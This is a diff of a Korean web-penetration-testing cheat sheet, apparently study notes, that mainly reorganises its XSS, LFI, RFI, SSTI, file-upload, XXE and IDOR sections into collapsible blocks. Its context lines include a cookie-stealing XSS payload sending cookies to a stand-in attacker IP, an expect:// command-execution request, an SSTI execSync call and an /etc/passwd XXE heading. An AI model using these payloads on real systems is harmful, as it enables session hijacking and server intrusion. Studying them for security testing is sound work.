@@ -26,8 +26,6 @@ echo 'hi!' | jq -srR '@uri'
 <script>console.log(document.cookie)</script>
 ```
 
-</details>
-
 ## 기본 공격 페이로드
 
 ### 스크립트 태그 기반
@@ -200,10 +198,11 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 3. 해당 input에 `script.js`를 요청하는 페이로드 삽입
 4. 피해자가 페이지를 방문하면 자동으로 쿠키가 공격자 서버로 전송됨
 
----
-# LFI (Local File Inclusion)
-> 웹 애플리케이션이 파일 경로를 제대로 검증하지 않아 공격자가 서버의 임의 파일을 읽을 수 있는 취약점입니다.
+</details>
 
+<details>
+    <summary><strong>LFI (Local File Inclusion)</strong></summary>
+    
 ## 기본 공격 기법
 
 ### 공격 팁
@@ -336,8 +335,10 @@ extension=expect
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ```
 
----
-# RFI (Remote File Inclusion)
+</details>
+
+<details>
+    <summary><strong>RFI (Remote File Inclusion)</strong></summary>
 > 외부 서버의 악성 파일을 포함시켜 실행하는 공격 기법
 
 ## 기본 RFI 공격
@@ -594,9 +595,10 @@ ffuf -w ./LFI-WordList-Linux:FUZZ \
      -fs 2287
 ```
 
----
+</details>
 
-# SSTI (Server-Side Template Injection)
+<details>
+    <summary><strong>SSTI (Server-Side Template Injection)</strong></summary>
 > 템플릿 엔진이 사용자 입력을 안전하게 처리하지 않아 서버 측에서 임의 코드를 실행할 수 있는 취약점
 
 ## 기본 탐지 페이로드
@@ -650,16 +652,17 @@ process.mainModule.require('child_process').execSync('ls -la')
 - SSTI 공격에서는 **동기(Synchronous) 함수**를 사용해야 응답을 받을 수 있음
 - 비동기 함수(`exec`, `spawn` 등)는 결과를 즉시 반환하지 않아 공격에 부적합
 
----
+</details>
 
-# File Upload
+<details>
+    <summary><strong>File Upload</strong></summary>
+    
 ## 클라이언트 사이드 검증 우회
 - front에서 파일타입만 확인하는 경우 파일 이름과 내용을 바꿔서 서버로 전송(image.jpg -> ex.php)
 - html 수정
 
 <img width="1942" height="455" alt="image" src="https://github.com/user-attachments/assets/5be7d857-603b-4260-9a90-facf245bde4f" />
 
----
 ## 확장자 우회 기법
 
 ### 유용한 Wordlist
@@ -726,10 +729,11 @@ done
 </svg>
 ```
 
----
+</details>
 
-## XXE (XML External Entity) 공격
-
+<details>
+    <summary><strong>XXE (XML External Entity) 공격</strong></summary>
+    
 ### /etc/passwd 읽기
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -806,7 +810,11 @@ curl -i -X OPTIONS http://SERVER_IP:PORT/
 - 특정 기능에 대한 권한이 없을 때 request method를 변경해서 시도
 - `burpsuite` : `change request method`
 
-# IDOR
+</details>
+
+<details>
+    <summary><strong>IDOR</strong></summary>
+
 - http://SERVER_IP:PORT/documents.php?uid=<change>
 - API method 변경해서 시도해보기.
 ```bash
@@ -833,8 +841,10 @@ for i in {1..10}; do
 done
 ```
 
+</details>
+
 <details>
-<summary><h1>XXE</h1></summary>
+<summary><strong>XXE</strong></summary>
     
 - `DOCTYPE`은 XML에서 한번만 선언될 수 있다.
 ```xml
